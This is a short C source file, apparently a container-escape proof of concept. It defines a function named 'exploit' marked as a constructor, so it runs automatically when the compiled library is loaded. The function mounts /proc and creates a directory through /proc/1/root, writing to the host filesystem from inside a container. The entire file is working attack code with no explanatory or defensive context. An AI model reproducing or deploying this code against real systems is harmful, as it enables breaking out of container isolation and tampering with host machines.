#include <stdlib.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <stddef.h>
#include <sys/mount.h>

void __attribute__((constructor)) exploit(){
    mount("proc", "/proc", "proc", 0, NULL);
    mkdir("/proc/1/root/ESCAPE", 0755);
    return;
}